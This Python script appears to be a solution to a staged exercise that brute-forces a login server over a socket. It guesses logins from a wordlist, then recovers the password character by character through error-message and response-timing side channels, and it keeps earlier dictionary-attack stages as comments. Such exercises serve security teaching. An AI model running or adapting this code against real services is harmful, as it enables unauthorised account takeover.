import os
import sys
import socket
import json
import time

# Stage 3/5
# args = sys.argv
# with socket.socket() as my_socket:
#     my_socket.connect((args[1], int(args[2])))
#     with open("passwords.txt", "r") as file:
#         while True:
#             password = str(file.readline()[:-1].lower())
#             pass_len = len(password)
#             if password.isdigit():
#                 my_socket.send(password.encode())
#                 response = my_socket.recv(16).decode()
#                 if response == "Connection success!":
#                     print(attempt)
#                     break
#             else:
#                 for i in range(pass_len ** 2 - 1):
#                     bin_num = bin(i)[2:].zfill(pass_len)
#                     attempt = "".join([password[j].capitalize() if int(bin_num[j]) else password[j] for j in range(pass_len)])
#                     my_socket.send(attempt.encode())
#                     response = my_socket.recv(64).decode()
#                     if response == "Connection success!":
#                         print(attempt)
#                         break
#                 else:
#                     continue
#                 break
# log_pass = {"login": "", "password": ""}


# Stage 4/5 + 5/5
def get_login(file):
    """Get login from file and try to send it."""
    while True:
        login = str(file.readline()[:-1])
        request = json.dumps({"login": login, "password": ""}).encode()
        my_socket.send(request)
        response = json.loads(my_socket.recv(64).decode())
        if response["result"] != 'Wrong login!':
            return login

# Stage 4/5
# def get_password(login):
#     """Make password and try to send it with login"""
#     password = ""
#     while True:
#         for i in range(32, 123):
#             attempt_pass = password + chr(i)
#             request = json.dumps({"login": login, "password": attempt_pass})
#             my_socket.send(request.encode())
#             response = json.loads(my_socket.recv(64).decode())
#             if response["result"] == "Wrong password!":
#                 continue
#             elif response["result"] == "Connection success!":
#                 return attempt_pass
#             elif response["result"] == "Exception happened during login":
#                 password = attempt_pass
#             else:
#                 print("Something wrong!!!!!!!!!!!!")
#                 print(response)
#                 break

# Stage 5/5
def get_password(login):
    """Make password and try to send it with login"""
    password = ""
    while True:
        for i in range(32, 123):
            attempt_pass = password + chr(i)
            request = json.dumps({"login": login, "password": attempt_pass})
            start = time.time()
            my_socket.send(request.encode())
            response = json.loads(my_socket.recv(64).decode())
            if response["result"] == "Connection success!":
                return attempt_pass
            elif response["result"] == "Wrong password!":
                if time.time() - start > 0.1:
                    password = attempt_pass
                continue
            else:
                print("Something wrong!!!!!!!!!!!!")
                print(response)
                break


args = sys.argv
# Stage 4/5 + 5/5
with socket.socket() as my_socket:
    a1 = args[1]
    a2 = int(args[2])
    my_socket.connect((a1, a2))
    with open("logins.txt", "r") as login_file:
        login = get_login(login_file)
        password = get_password(login)
        print(json.dumps({"login": login, "password": password}))
